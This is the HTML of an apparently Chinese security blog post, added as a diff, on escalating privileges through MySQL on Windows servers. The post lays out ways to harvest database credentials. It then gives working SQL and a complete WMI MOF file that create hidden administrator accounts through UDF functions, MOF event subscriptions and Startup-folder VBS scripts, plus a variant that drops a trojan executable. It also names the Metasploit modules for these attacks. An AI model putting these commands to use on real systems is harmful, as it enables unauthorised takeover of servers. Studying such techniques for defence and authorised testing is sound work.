@@ -1,0 +1,634 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"aqyoung.github.io","root":"/","scheme":"Muse","version":"7.7.2","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="数据库提权数据库提权是后渗透阶段的其中一种常用提权的方式，所以，我们需要熟悉常见的数据库，以及常用的提权方法，方能在遇到的时候作为一个突破点（这篇是之前的库存~）">
+<meta name="keywords" content="提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mysql数据库提权">
+<meta property="og:url" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;2020&#x2F;06&#x2F;26&#x2F;sqltq_mysql&#x2F;index.html">
+<meta property="og:site_name" content="AqYoung">
+<meta property="og:description" content="数据库提权数据库提权是后渗透阶段的其中一种常用提权的方式，所以，我们需要熟悉常见的数据库，以及常用的提权方法，方能在遇到的时候作为一个突破点（这篇是之前的库存~）">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tqwmysql&#x2F;1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tqwmysql&#x2F;2.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tqwmysql&#x2F;3.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tqwmysql&#x2F;4.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tqwmysql&#x2F;8.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tqwmysql&#x2F;6.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tqwmysql&#x2F;7.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tqwmysql&#x2F;9.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tqwmysql&#x2F;13.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tqwmysql&#x2F;14.png">
+<meta property="og:updated_time" content="2020-06-26T13:02:05.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tqwmysql&#x2F;1.png">
+
+<link rel="canonical" href="https://aqyoung.github.io/2020/06/26/sqltq_mysql/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Mysql数据库提权 | AqYoung</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">AqYoung</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">分享渗透知识与技巧</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://aqyoung.github.io/2020/06/26/sqltq_mysql/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="AqYoung">
+      <meta itemprop="description" content="努力将一切"Regular attacks"工程化！">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="AqYoung">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Mysql数据库提权
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-06-26 20:52:19 / 修改时间：13:02:05" itemprop="dateCreated datePublished" datetime="2020-06-26T20:52:19+00:00">2020-06-26</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E4%B8%8E%E7%BB%B4%E6%8C%81/" itemprop="url" rel="index"><span itemprop="name">权限提升与维持</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/06/26/sqltq_mysql/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/06/26/sqltq_mysql/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h1><p>数据库提权是后渗透阶段的其中一种常用提权的方式，所以，我们需要熟悉常见的数据库，以及常用的提权方法，方能在遇到的时候作为一个突破点（这篇是之前的库存~）<a id="more"></a></p>
+<h2 id="MySql"><a href="#MySql" class="headerlink" title="MySql"></a>MySql</h2><blockquote>
+<p>MySQL是一个关系型数据库管理系统，由瑞典MySQL AB 公司开发，属于 Oracle 旗下产品。MySQL 是最流行的关系型数据库管理系统之一。</p>
+</blockquote>
+<h3 id="MySql提权基础"><a href="#MySql提权基础" class="headerlink" title="MySql提权基础"></a>MySql提权基础</h3><p>一、MySql提权具备条件</p>
+<pre><code>1、mysql数据库需要以系统权限继承（默认）
+2、需要获取mysql root账号密码</code></pre><p><a href="https://www.cnblogs.com/richardzhu/p/3318595.html" target="_blank" rel="noopener">Mysql权限管理</a></p>
+<p>二、MySql密码获取</p>
+<p>1、查找数据库user表文件</p>
+<p>Windows：MySQL默认配置文件保存在 “MySQL\data\mysql” 该目录下的 user.* 中。</p>
+<p><img src="/images/tqwmysql/1.png" alt=""></p>
+<p><img src="/images/tqwmysql/2.png" alt=""></p>
+<p>Linux：查看 /var/lib/mysql/mysql<br>除此之外linux还可以查看history记录 <strong>/root/.bash_history</strong> 、 <strong>/root/.mysql_history</strong> 等等一系列信息收集</p>
+<p>2、查找网站的数据库配置文件</p>
+<p>一般网站系统都会有一个文件用来连接数据库，一般存在 config、application、conn、db 等配置相关的文件。如果是知道cms系统的话，直接去搜索相关的信息就好了。</p>
+<p><img src="/images/tqwmysql/3.png" alt=""></p>
+<p>3、通过查询语句获得密码</p>
+<p>直接通过以下查询语句直接查询mysql数据库中的所有用户和密码。</p>
+<pre><code>select user,password from mysql.user;
+select user,password from mysql.user where user =&apos;root&apos;;</code></pre><p><img src="/images/tqwmysql/4.png" alt=""></p>
+<p>4、Brute force</p>
+<p>如果目标网站有对外开启3306端口的话，可以使用Hydra、John等等相关工具进行暴力破解。</p>
+<p>5、对于MySQL加密算法</p>
+<p>MySQL 4.1 版本之前是 MySQL323 （16位）加密，MySQL 4.1 和之后的版本是MySQLSHA1（41位） 加密 </p>
+<h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><p><strong>漏洞原理：</strong></p>
+<p>UDF(user-defined function)提供MySQL的一个扩展接口。UDF提权就是利用这个扩展接口的调用来执行代码。</p>
+<p><strong>利用条件：</strong></p>
+<pre><code>1. Windows &lt;= 2008
+2. MySQL 在 &quot;MySQL\lib\plugin&quot;或者&quot;c:/windows/system32/&quot; 目录有写权限
+3. 拥有MySQL的账号并且能够insert和delete权限以创建和抛弃函数</code></pre><p><strong>漏洞利用：</strong></p>
+<p>一、利用udf.php文件来提权，udf相关的提权php文件在github上面有很多，这里就不贴出了。</p>
+<p>1、dump “udf.dll” 到”MySQL\lib\plugin”(MySQL &gt; 5.2);如果MySQL &lt; 5.2 导出到 “c:/windows/system32/“.</p>
+<p><img src="/images/tqwmysql/8.png" alt=""></p>
+<p>“MySQL\lib\plugin”目录必须存在，如果不存在的话，可以使用NTFS ADS流来创建文件夹</p>
+<pre><code>select @@basedir; //查找到MySQL的安装目录
+# 下面的 dumpfile需要更改成你对应的MySQL目录（如:C:/phpStudy/MySQL/lib）
+select &apos;It is dll&apos; into dumpfile &apos;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&apos;; //利用NTFS ADS创建lib目录
+select &apos;It is dll&apos; into dumpfile &apos;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&apos;;//利用NTFS ADS创建plugin目录</code></pre><p>2、执行select语句进行提权</p>
+<p>创建用户</p>
+<p><img src="/images/tqwmysql/6.png" alt=""></p>
+<p>加入超级管理员组<br><img src="/images/tqwmysql/7.png" alt=""></p>
+<p>具体select如下：</p>
+<pre><code>select shell(&apos;cmd&apos; ,&apos;net user test 123456 /add&apos;); # 创建test用户
+select shell(&apos;cmd&apos; ,&apos;net localgroup administrators test /add&apos;); # 加入超级管理员组
+drop function shell; # 删除函数
+delete from mysql.func where name=&apos;shell&apos;  # 删除函数</code></pre><p>其他功能函数说明：</p>
+<pre><code>about 帮助函数
+cmdshell 执行cmd
+open3389 开启3389终端服务
+backshell 反弹shell
+ProcessView 枚举系统进程</code></pre><p>除了利用udf.php文件之外，同样也可以使用MSF进行提权。相关的exploit为：</p>
+<pre><code>exploit/multi/mysql/mysql_udf_payload</code></pre><h3 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h3><p><strong>漏洞原理：</strong></p>
+<p>MOF的提权原理是利用MOF文件以系统权限每隔一段时间执行。所以我们可以通过MySQL语句将文件写入一个MOF文件替换掉原有的MOF文件，通过控制MOF文件的vbs脚本的内容让系统执行命令，进行提权。</p>
+<p><a href="https://www.exploit-db.com/exploits/23083" target="_blank" rel="noopener">MySql远程提权</a>，其中Windows管理规范(WMI)提供了三种方法编译WMI存储库的托管对象格式（MOF）文件：</p>
+<pre><code>1.运行 MOF 文件指定为命令行参数将 Mofcomp.exe 文件。
+
+2.使用 IMofCompiler 接口和 $ CompileFile 方法。
+
+3.拖放到 %SystemRoot%\System32\Wbem\MOF 文件夹的 MOF 文件。</code></pre><p>我们使用的就是第三种方法了。</p>
+<p><strong>利用条件：</strong></p>
+<pre><code>1. Windows &lt;= 2003
+2. MySQL 在 c:/windows/system32/wbem/mof/ 目录有写权限
+3. 已知数据库账号密码
+4. secure-file-priv参数不为null</code></pre><p><strong>漏洞利用：</strong></p>
+<p>1、上传一个mof文件,任意可以写入的文件夹(C:/phpStudy/WWW/nullevt.mof)</p>
+<p>mof文件如下:</p>
+<pre><code>#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)
+instance of __EventFilter as $EventFilter
+{
+EventNamespace = &quot;Root\\Cimv2&quot;;
+Name = &quot;filtP2&quot;;
+Query = &quot;Select * From __InstanceModificationEvent &quot;
+&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;
+&quot;And TargetInstance.Second = 5&quot;;
+QueryLanguage = &quot;WQL&quot;;
+};
+instance of ActiveScriptEventConsumer as $Consumer
+{
+Name = &quot;consPCSV2&quot;;
+ScriptingEngine = &quot;JScript&quot;;
+ScriptText =
+&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user admin 12345678 /add\&quot;)&quot;;
+};
+instance of __FilterToConsumerBinding
+{
+Consumer = $Consumer;
+Filter = $EventFilter;
+};</code></pre><p>2、执行select语句</p>
+<pre><code>select load_file(&apos;C:/phpStudy/WWW/nullevt.mof&apos;) into dumpfile &apos;c:/windows/system32/wbem/mof/nullevt.mof&apos;;</code></pre><p>如果出现导入文件提示 –secure-file-priv option 问题，可以修改相关配置文件。参考<a href="https://www.cnblogs.com/Braveliu/p/10728162.html" target="_blank" rel="noopener">这篇文章</a></p>
+<p>load_file是要移动的文件，dumpfile移动到’c:/windows/system32/wbem/mof/nullevt.mof’，这个地方是固定的。</p>
+<p>执行成功之后，会新建一个用户，需要再次上传，将用户加入管理员组。</p>
+<pre><code>net.exe user admin 12345678 /add
+net.exe user localgroup administrators admin /add</code></pre><p>之后可以开启3389进行远程控制，或者Telnet等等。除了上面的提权方法还可以利用MSF相关exploit进行提权：</p>
+<pre><code>use exploit/windows/mysql/mysql_mof</code></pre><p>可以参考<a href="https://www.secpulse.com/archives/63292.html" target="_blank" rel="noopener">这篇文章</a></p>
+<h3 id="vbs、bat启动项提权"><a href="#vbs、bat启动项提权" class="headerlink" title="vbs、bat启动项提权"></a>vbs、bat启动项提权</h3><p><strong>漏洞原理：</strong></p>
+<p>其原理就是利用MySQL数据库的写功能，进行脚本的写入。让服务器重启，从而执行启动项的脚本代码，进而提权。</p>
+<p><strong>利用条件：</strong></p>
+<pre><code>1.拥有写入启动项文件夹的权限
+2.能够使服务器重启</code></pre><p><strong>漏洞利用：</strong></p>
+<p>使用webshell连接上数据库之后,建立表a，将VBS写入表里，之后导入启动项文件夹，需要有启动项文件的写入权限，0表示不弹出CMD窗口运行。 </p>
+<p>1、建立表a</p>
+<p><img src="/images/tqwmysql/9.png" alt=""></p>
+<p>2、创建完成之后利用 insert into a values将要运行的命令写入表里，之后导入到启动项文件夹。</p>
+<p><img src="/images/tqwmysql/13.png" alt=""></p>
+<p>执行完成之后对应的文件夹就会存在一个vbs文件了。</p>
+<p><img src="/images/tqwmysql/14.png" alt=""></p>
+<p>具体代码如下：</p>
+<pre><code>create table a (cmd text); 
+insert into a values (&quot;set wshshell=createobject (&quot;&quot;wscript.shell&quot;&quot;) &quot; ); 
+insert into a values (&quot;a=wshshell.run (&quot;&quot;cmd.exe /c net user aqyoung 123456 /add&quot;&quot;,0) &quot; ); 
+insert into a values (&quot;b=wshshell.run (&quot;&quot;cmd.exe /c net localgroup administrators aqyoung /add&quot;&quot;,0) &quot; ); 
+select * from a into outfile &quot;C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\a.vbs&quot;; </code></pre><p>3、想办法让服务器重启，即可创建管理员账号。</p>
+<p>除此之外还有另外一种写法：</p>
+<pre><code>create table a (cmd BLOB); 
+insert into a values （CONVERT(木马的16进制代码,CHAR)); 
+select * from a into dumpfile ’C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\启动\\mm.exe’ 
+drop table a; </code></pre><p>利用方法和上面一样。</p>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>MySQL的提权上面是三种比较经典的提权方式了，他们的共同原理都是利用sql语句，将要执行的代码文件，移动到对应会执行的文件夹，比如说（启动项、mof文件）；还有一种方式就是可能类似于用户自定义函数来执行代码了。从网上的文章中也发现有很多其他的方法，后续还需要更多实践了。没有实践都是纸上谈兵。</p>
+<p>距上次写MySQL提权已经差不多两周的时间了，因为自己的一些事情所以没有办法。然后复现这些漏洞主要是帮助自己理解这些漏洞原理，以及一个提高一个实际操作能力。</p>
+<p><strong>声明：</strong></p>
+<ul>
+<li>笔者初衷用于分享与交流网络知识，若读者因此作出任何危害网络安全行为后果自负，与作者无关！</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>AqYoung
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://aqyoung.github.io/2020/06/26/sqltq_mysql/" title="Mysql数据库提权">https://aqyoung.github.io/2020/06/26/sqltq_mysql/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-ND</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"># 提权</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/05/29/shellscrapy/" rel="prev" title="shell script 小工具(信息收集)">
+      <i class="fa fa-chevron-left"></i> shell script 小工具(信息收集)
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#数据库提权"><span class="nav-number">1.</span> <span class="nav-text">数据库提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#MySql"><span class="nav-number">1.1.</span> <span class="nav-text">MySql</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MySql提权基础"><span class="nav-number">1.1.1.</span> <span class="nav-text">MySql提权基础</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UDF提权"><span class="nav-number">1.1.2.</span> <span class="nav-text">UDF提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MOF提权"><span class="nav-number">1.1.3.</span> <span class="nav-text">MOF提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vbs、bat启动项提权"><span class="nav-number">1.1.4.</span> <span class="nav-text">vbs、bat启动项提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#小结"><span class="nav-number">1.1.5.</span> <span class="nav-text">小结</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="AqYoung"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">AqYoung</p>
+  <div class="site-description" itemprop="description">努力将一切"Regular attacks"工程化！</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-nd.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">AqYoung</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/muse.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : true,
+      appId      : 'QWm74uHDCgmhInHfKwyFBod1-gzGzoHsz',
+      appKey     : '1ktt74cyVPPjTy4P28nMIH2V',
+      placeholder: "Just go go （记得在上面留下昵称和邮箱，方便回复！）",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '5' || 10,
+      visitor    : false,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
